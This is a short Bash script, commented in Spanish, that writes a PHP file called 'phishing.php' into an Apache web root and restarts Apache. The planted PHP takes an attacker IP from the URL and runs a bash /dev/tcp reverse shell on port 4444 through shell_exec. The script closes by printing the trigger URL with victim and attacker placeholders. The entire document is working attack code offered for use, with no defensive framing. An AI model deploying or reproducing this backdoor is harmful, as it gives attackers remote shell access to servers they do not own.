#!/bin/bash

# Variables
PUERTO="4444"  # Puerto donde se recibirá la conexión
RUTA_PHP="/var/www/html/phishing.php"  # Ruta del script PHP

# 1. Crear el script PHP malicioso
echo "Creando el script PHP para la reverse shell..."
echo "<?php
if (isset(\$_GET['email']) && isset(\$_GET['ip'])) {
    \$email = \$_GET['email'];  // Obtener el email de la URL
    \$ip_atacante = \$_GET['ip'];  // Obtener la IP del atacante de la URL
    \$puerto = \"$PUERTO\";  // Puerto fijo

    // Registrar el intento (opcional, para auditoría)
    file_put_contents('/var/www/html/log.txt', \"Intento con correo: \$email desde IP: \$ip_atacante\n\", FILE_APPEND);

    // Comando para ejecutar la reverse shell
    \$cmd = \"bash -i >& /dev/tcp/\$ip_atacante/\$puerto 0>&1\";
    shell_exec(\$cmd);
}
?>" | sudo tee $RUTA_PHP > /dev/null

# 2. Asegurar que Apache está activo
echo "Reiniciando Apache..."
sudo systemctl restart apache2

echo "Configuración completa. Usa el siguiente enlace para ejecutar la reverse shell:"
echo "http://<IP_DE_LA_VÍCTIMA>/phishing.php?email=manoloTheServerSharker@sarkers.mx&ip=<IP_DEL_ATACANTE>"
